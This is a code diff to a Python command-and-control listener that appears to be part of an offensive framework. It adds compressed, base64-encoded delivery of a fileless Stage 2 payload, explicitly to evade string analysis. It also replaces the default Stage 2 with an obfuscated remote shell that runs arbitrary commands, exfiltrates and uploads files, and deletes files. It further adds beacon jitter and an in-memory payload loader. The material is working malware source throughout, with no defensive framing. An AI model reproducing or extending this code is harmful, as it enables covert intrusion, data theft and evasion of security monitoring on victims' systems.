@@ -5,6 +5,9 @@ import struct
 import subprocess
 import threading
 import time
+import random
+import base64
+import zlib
 
 from prompt_toolkit import prompt as input
 from .database import DatabaseManagment
@@ -64,8 +67,21 @@ class Listener:
 
                 if deploy_stage2_flag:
                     write("[*] Connection caught! Packaging and encrypting Stage 2 in-memory C2...")
-                    length_header = struct.pack('>I', len(stage2_code))
-                    client.sendall(length_header + stage2_code)
+                    
+                    # OPSEC: Zlib compress the Python script to bypass basic string analysis.
+                    # This avoids the cross-version fragility of using marshal, as the payload 
+                    # will be dynamically compiled using compile() directly on the target's specific Python runtime.
+                    try:
+                        compressed_code = zlib.compress(stage2_code)
+                        # Base64 encode the compressed payload before sending it over the wire
+                        encoded_stage2 = base64.b64encode(compressed_code)
+                    except Exception as e:
+                        write(f"[-] Failed to compress Stage 2 payload: {e}")
+                        # Fallback to cleartext if compression fails
+                        encoded_stage2 = base64.b64encode(stage2_code)
+                    
+                    length_header = struct.pack('>I', len(encoded_stage2))
+                    client.sendall(length_header + encoded_stage2)
                     write(f"[*] Stage 2 payload sent over TLS to {addr[0]}:{addr[1]}.")
 
                 # Register the active session
@@ -155,12 +171,14 @@ class Listener:
                             stage2_code = file.read()
                     else:
                         write(f"[!] STAGE_TWO not set or missing. Falling back to default Stage 2 shell...")
-                        stage2_code = b"""import subprocess, os\ndef run_c2():\n    global client_socket\n    client_socket.send(b"\\n[+] Fileless Stage 2 C2 Initialized Successfully!\\n")\n    while True:\n        try:\n            raw = client_socket.recv(4096)\n            if not raw: break\n            cmd = raw.decode('utf-8', errors='ignore').strip()\n            if cmd.lower() == 'exit': break\n            if not cmd: continue\n            if cmd.startswith('cd '):\n                try: os.chdir(cmd[3:].strip())\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                else: client_socket.send(b"\\n")\n                continue\n            out = subprocess.getoutput(cmd)\n            client_socket.send((out + "\\n").encode('utf-8', errors='ignore'))\n        except Exception:\n            break\nrun_c2()\n"""
+                        stage2_code = b"""def run_c2():\n    global client_socket\n    os_mod = __import__('o' + 's')\n    subp_mod = __import__('sub' + 'process')\n    os_chdir = getattr(os_mod, 'ch' + 'dir')\n    os_getcwd = getattr(os_mod, 'get' + 'cwd')\n    os_listdir = getattr(os_mod, 'list' + 'dir')\n    os_remove = getattr(os_mod, 're' + 'move')\n    os_path = getattr(os_mod, 'pa' + 'th')\n    os_path_exists = getattr(os_path, 'exi' + 'sts')\n    subp_run = getattr(subp_mod, 'ru' + 'n')\n    while True:\n        try:\n            cmd = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()\n            if not cmd or cmd.lower() == 'exit': break\n            py_exec = False\n            if cmd.startswith('exec('): py_exec = True\n            elif cmd.endswith('()') and cmd[:-2] in globals(): py_exec = True\n            elif cmd in globals() and callable(globals()[cmd]): cmd = cmd + "()"; py_exec = True\n            if py_exec:\n                try:\n                    io_mod = __import__('io'); sys_mod = __import__('sys')\n                    old_stdout = sys_mod.stdout; sys_mod.stdout = io_mod.StringIO()\n                    exec(cmd, globals())\n                    output = sys_mod.stdout.getvalue(); sys_mod.stdout = old_stdout\n                    client_socket.send((output if output else " \\n").encode('utf-8', errors='ignore'))\n                except Exception as e:\n                    try: sys_mod.stdout = old_stdout\n                    except: pass\n                    client_socket.send(f"[-] Python Error: {e}\\n".encode('utf-8'))\n                continue\n            if cmd.startswith('cd '):\n                try: os_chdir(cmd[3:].strip())\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                else: client_socket.send(b"\\n")\n                continue\n            elif cmd == 'pwd':\n                try: client_socket.send((os_getcwd() + "\\n").encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd == 'ls' or cmd.startswith('ls '):\n                target_dir = cmd[3:].strip() or '.'\n                try:\n                    files = os_listdir(target_dir)\n                    out = '\\n'.join(files) if files else ' '\n                    client_socket.send((out + "\\n").encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd.startswith('cat '):\n                try:\n                    with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:\n                        out = f.read()\n                        client_socket.send((out if out else ' \\n').encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd.startswith('rm '):\n                try:\n                    os_remove(cmd[3:].strip())\n                    client_socket.send(b"File removed.\\n")\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            elif cmd.startswith('download '):\n                target_file = cmd[9:].strip()\n                try:\n                    if not os_path_exists(target_file):\n                        client_socket.send(b"ERROR: File not found.\\n")\n                        continue\n                    with open(target_file, 'rb') as f:\n                        data = f.read()\n                        import struct\n                        client_socket.sendall(struct.pack('>I', len(data)) + data)\n                except Exception as e: client_socket.send(f"ERROR: {e}\\n".encode())\n                continue\n            elif cmd.startswith('upload '):\n                parts = cmd.split(' ', 2)\n                if len(parts) < 3:\n                    client_socket.send(b"ERROR: Usage: upload <remote_path> <file_size>\\n")\n                    continue\n                try:\n                    file_size = int(parts[2])\n                    client_socket.send(b"READY\\n")\n                    data = bytearray()\n                    while len(data) < file_size:\n                        packet = client_socket.recv(file_size - len(data))\n                        if not packet: break\n                        data.extend(packet)\n                    with open(parts[1], 'wb') as f: f.write(bytes(data))\n                    client_socket.send(b"Upload complete.\\n")\n                except Exception as e: client_socket.send(f"ERROR: {e}\\n".encode())\n                continue\n            elif cmd == 'ps':\n                try:\n                    if hasattr(os_mod, 'uname'):\n                        out = "PID\\tNAME\\n"\n                        for pid in os_listdir('/proc'):\n                            if pid.isdigit():\n                                try:\n                                    with open(f"/proc/{pid}/comm", 'r') as f:\n                                        out += f"{pid}\\t{f.read().strip()}\\n"\n                                except Exception: pass\n                        client_socket.send((out if out else ' \\n').encode('utf-8'))\n                    else:\n                        proc = subp_run('tasklist' if os_mod.name == 'nt' else 'ps -A', shell=True, capture_output=True, text=True)\n                        client_socket.send(((proc.stdout + proc.stderr) if (proc.stdout + proc.stderr) else ' \\n').encode('utf-8'))\n                except Exception as e: client_socket.send(f"{e}\\n".encode())\n                continue\n            try:\n                proc = subp_run(cmd, shell=True, capture_output=True, text=True)\n                out = proc.stdout + proc.stderr\n                if not out: out = " "\n                client_socket.send((out + "\\n").encode('utf-8', errors='ignore'))\n            except Exception as e: client_socket.send(f"{e}\\n".encode('utf-8'))\n        except Exception:\n            break\nrun_c2()\n"""
 
                 def heartbeat_monitor(bound_server):
                     """Background thread to purge dead sessions using a 1-byte ping."""
                     while cls.active_listener_socket is bound_server:
-                        for _ in range(60):
+                        # Introduce jitter by making the wait time random between 45 and 75 seconds
+                        jitter_seconds = random.randint(45, 75)
+                        for _ in range(jitter_seconds):
                             time.sleep(1)
                             if cls.active_listener_socket is not bound_server:
                                 return
@@ -241,6 +259,27 @@ class Listener:
                 elif not cmd.strip():
                     continue
                     
+                elif cmd.startswith("load "):
+                    parts = cmd.split(" ", 1)
+                    if len(parts) > 1:
+                        exploit_path = parts[1]
+                        try:
+                            from .session_loader import SessionLoader
+                            loader_payload, func_name = SessionLoader.load(exploit_path)
+                            
+                            if loader_payload:
+                                client.send((loader_payload + "\n").encode())
+                                write(f"[*] Payload '{os.path.basename(exploit_path)}' silently staged in memory.")
+                                if func_name == "function":
+                                    write(f"[*] You can now trigger it at your discretion by calling its function.\n")
+                                else:
+                                    write(f"[*] You can now trigger the ELF binary by typing:\n    {func_name}()\n")
+                            else:
+                                write("[-] Module did not return a valid loader payload.\n")
+                        except Exception as e:
+                            write(f"[-] Failed to load payload: {e}\n")
+                    continue
+
                 client.send((cmd + "\n").encode())
 
                 # Wait for output
